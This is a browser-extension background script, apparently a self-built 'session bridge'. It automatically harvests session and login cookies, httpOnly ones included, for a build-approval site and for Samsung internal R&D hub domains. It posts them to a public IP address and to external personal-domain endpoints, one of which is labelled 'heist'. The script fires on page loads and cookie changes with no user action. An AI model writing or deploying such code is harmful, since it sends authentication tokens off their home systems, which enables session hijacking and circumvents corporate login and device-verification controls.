// BAS & Mobile R&D Hub Session Bridge Background Service Worker
const api = typeof browser !== "undefined" ? browser : chrome;

// BAS Endpoints
const BAS_TARGET_ENDPOINTS = [
    "http://107.102.39.55/tkdn/api_bas_bridge.php",
    "http://107.102.39.55/project_manager/api_bas_bridge.php",
    "http://107.102.39.55/api_bas_bridge.php",
    "http://107.102.39.55:8089/api_bas_bridge.php",
    "http://localhost/tkdn/api_bas_bridge.php",
    "http://127.0.0.1/tkdn/api_bas_bridge.php",
    "http://localhost/project_manager/api_bas_bridge.php",
    "http://127.0.0.1/project_manager/api_bas_bridge.php",
    "http://localhost/api_bas_bridge.php",
    "http://127.0.0.1/api_bas_bridge.php",
    "http://localhost:8089/api_bas_bridge.php",
    "http://127.0.0.1:8089/api_bas_bridge.php",
    "http://localhost:8888/api_bas_bridge.php",
    "http://127.0.0.1:8888/api_bas_bridge.php",
    "https://gba.endrisusanto.my.id/api_bas_bridge.php",
    "https://gba.endrisusanto.my.id/tkdn/api_bas_bridge.php"
];

// Heist Hub Endpoints
const HEIST_TARGET_ENDPOINTS = [
    "http://localhost:4020/api/settings/auth",
    "http://127.0.0.1:4020/api/settings/auth",
    "https://heist.endrisusanto.my.id/api/settings/auth"
];

let lastSyncTime = 0;
const MIN_SYNC_INTERVAL = 10000; // 10 seconds debounce

let lastHubSyncTime = 0;
const MIN_HUB_SYNC_INTERVAL = 10000;

// ========================
// 1. BAS SESSION BRIDGE
// ========================
async function captureAndSendBASSession(force = false) {
    const now = Date.now();
    if (!force && (now - lastSyncTime < MIN_SYNC_INTERVAL)) {
        return { success: false, reason: "debounced" };
    }

    try {
        if (!api.cookies || !api.cookies.getAll) {
            return { success: false, reason: "no_cookies_permission" };
        }

        const cookies = await api.cookies.getAll({ domain: "buildapprovalsystem.com" });
        if (!cookies || cookies.length === 0) {
            return { success: false, reason: "no_cookies_found" };
        }

        let sid = "";
        let device = "";
        const allCookies = [];

        for (const c of cookies) {
            allCookies.push(`${c.name}=${c.value}`);
            if (c.name === "sid") {
                sid = c.value;
            } else if (c.name.startsWith("CF_VERIFIED_DEVICE") || c.name.includes("VERIFIED_DEVICE")) {
                device = c.value;
            }
        }

        if (!sid) {
            return { success: false, reason: "no_sid_cookie" };
        }

        const payload = {
            sid: sid,
            device: device,
            cookie_header: allCookies.join("; "),
            timestamp: Math.floor(now / 1000)
        };

        lastSyncTime = now;

        const sendPromises = BAS_TARGET_ENDPOINTS.map(async (url) => {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3500);
            try {
                const response = await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload),
                    signal: controller.signal
                });
                clearTimeout(timeoutId);
                return { url, ok: response.ok, status: response.status };
            } catch (err) {
                clearTimeout(timeoutId);
                return { url, ok: false, error: err.message };
            }
        });

        const results = await Promise.allSettled(sendPromises);
        const successfulEndpoints = results
            .filter(r => r.status === "fulfilled" && r.value && r.value.ok)
            .map(r => r.value.url);

        return {
            success: successfulEndpoints.length > 0,
            synced_count: successfulEndpoints.length,
            endpoints: successfulEndpoints,
            total_attempted: BAS_TARGET_ENDPOINTS.length,
            has_sid: true,
            has_device: !!device
        };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

async function checkEndpointsStatus() {
    const checks = BAS_TARGET_ENDPOINTS.map(async (url) => {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 2500);
        try {
            const response = await fetch(url, {
                method: "GET",
                signal: controller.signal
            });
            clearTimeout(timeoutId);
            const data = await response.json().catch(() => null);
            return {
                url,
                reachable: true,
                status: response.status,
                active: data && data.active,
                data: data
            };
        } catch (err) {
            clearTimeout(timeoutId);
            return {
                url,
                reachable: false,
                error: err.message
            };
        }
    });

    const settled = await Promise.allSettled(checks);
    return settled.map(s => s.status === "fulfilled" ? s.value : { reachable: false });
}

// ==============================
// 2. MOBILE R&D HUB SESSION SYNC
// ==============================
async function captureAndSendHubSession(force = false) {
    const now = Date.now();
    if (!force && (now - lastHubSyncTime < MIN_HUB_SYNC_INTERVAL)) {
        return { success: false, reason: "debounced" };
    }

    try {
        if (!api.cookies || !api.cookies.getAll) {
            return { success: false, reason: "no_cookies_permission" };
        }

        // Query cookies from mobilerndhub.sec.samsung.net and .samsung.net
        const [hubCookies, samsungCookies] = await Promise.all([
            api.cookies.getAll({ domain: "mobilerndhub.sec.samsung.net" }).catch(() => []),
            api.cookies.getAll({ domain: "samsung.net" }).catch(() => [])
        ]);

        const rawCookies = [...(hubCookies || []), ...(samsungCookies || [])];
        if (rawCookies.length === 0) {
            return { success: false, reason: "no_cookies_found" };
        }

        const uniqueMap = new Map();
        for (const c of rawCookies) {
            uniqueMap.set(`${c.name}:${c.domain}`, c);
        }

        const cookies = Array.from(uniqueMap.values()).map(c => ({
            name: c.name,
            value: c.value,
            domain: c.domain,
            path: c.path || "/",
            expires: typeof c.expirationDate === 'number' ? Math.floor(c.expirationDate) : Math.floor(now / 1000) + 86400 * 30,
            httpOnly: Boolean(c.httpOnly),
            secure: Boolean(c.secure),
            sameSite: c.sameSite === 'lax' ? 'Lax' : c.sameSite === 'strict' ? 'Strict' : c.sameSite === 'no_restriction' ? 'None' : 'Lax'
        }));

        const loginCookie = cookies.find(c => c.name === "EP_LOGINID");
        const username = loginCookie ? loginCookie.value : "endri.s";

        const hasHubSession = cookies.some(c => 
            c.name === "SESSION" || 
            c.name === "sessionid" || 
            c.name === "csrftoken" || 
            c.name === "EP6_UTOKEN" ||
            c.name === "EP_LOGINID"
        );

        if (!hasHubSession) {
            return { success: false, reason: "no_session_cookies" };
        }

        const payload = {
            username: username,
            cookies: cookies,
            origins: [{ origin: "https://mobilerndhub.sec.samsung.net", localStorage: [] }]
        };

        lastHubSyncTime = now;

        const sendPromises = HEIST_TARGET_ENDPOINTS.map(async (url) => {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3500);
            try {
                const response = await fetch(url, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload),
                    signal: controller.signal
                });
                clearTimeout(timeoutId);
                return { url, ok: response.ok, status: response.status };
            } catch (err) {
                clearTimeout(timeoutId);
                return { url, ok: false, error: err.message };
            }
        });

        const results = await Promise.allSettled(sendPromises);
        const successfulEndpoints = results
            .filter(r => r.status === "fulfilled" && r.value && r.value.ok)
            .map(r => r.value.url);

        return {
            success: successfulEndpoints.length > 0,
            synced_count: successfulEndpoints.length,
            endpoints: successfulEndpoints,
            username: username,
            cookies_count: cookies.length
        };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

async function checkHubStatus() {
    let hasLocalSession = false;
    let username = '';
    let cookiesCount = 0;
    if (api.cookies && api.cookies.getAll) {
        try {
            const [c1, c2] = await Promise.all([
                api.cookies.getAll({ domain: "mobilerndhub.sec.samsung.net" }).catch(() => []),
                api.cookies.getAll({ domain: "samsung.net" }).catch(() => [])
            ]);
            const all = [...c1, ...c2];
            cookiesCount = all.length;
            hasLocalSession = all.some(c => c.name === "SESSION" || c.name === "sessionid" || c.name === "EP6_UTOKEN");
            const loginC = all.find(c => c.name === "EP_LOGINID");
            if (loginC) username = loginC.value;
        } catch {}
    }

    const checks = HEIST_TARGET_ENDPOINTS.map(async (url) => {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 2000);
        try {
            const response = await fetch(url, { method: "GET", signal: controller.signal });
            clearTimeout(timeoutId);
            const data = await response.json().catch(() => null);
            return { url, reachable: true, active: data && data.valid, data };
        } catch (err) {
            clearTimeout(timeoutId);
            return { url, reachable: false, error: err.message };
        }
    });

    const settled = await Promise.allSettled(checks);
    const endpoints = settled.map(s => s.status === "fulfilled" ? s.value : { reachable: false });
    return { endpoints, hasLocalSession, username, cookiesCount };
}

// ========================
// LISTENERS & DISPATCHERS
// ========================
api.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (tab && tab.url) {
        if (tab.url.includes("buildapprovalsystem.com") && changeInfo.status === "complete") {
            captureAndSendBASSession(false);
        } else if (tab.url.includes("mobilerndhub.sec.samsung.net") && changeInfo.status === "complete") {
            captureAndSendHubSession(false);
        }
    }
});

if (api.cookies && api.cookies.onChanged) {
    api.cookies.onChanged.addListener((changeInfo) => {
        const domain = (changeInfo.cookie && changeInfo.cookie.domain) || "";
        if (domain.includes("buildapprovalsystem.com")) {
            if (changeInfo.cookie.name === "sid" || changeInfo.cookie.name.includes("VERIFIED_DEVICE")) {
                captureAndSendBASSession(false);
            }
        } else if (domain.includes("mobilerndhub") || domain.includes("samsung.net")) {
            if (changeInfo.cookie.name === "SESSION" || changeInfo.cookie.name === "sessionid" || changeInfo.cookie.name === "EP6_UTOKEN") {
                captureAndSendHubSession(false);
            }
        }
    });
}

api.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "sync_bas_session") {
        captureAndSendBASSession(true).then((res) => {
            sendResponse({ status: "done", result: res });
        });
        return true;
    } else if (request.action === "check_bas_status") {
        checkEndpointsStatus().then((res) => {
            sendResponse({ endpoints: res });
        });
        return true;
    } else if (request.action === "sync_hub_session") {
        captureAndSendHubSession(true).then((res) => {
            sendResponse({ status: "done", result: res });
        });
        return true;
    } else if (request.action === "check_hub_status") {
        checkHubStatus().then((res) => {
            sendResponse(res);
        });
        return true;
    }
});
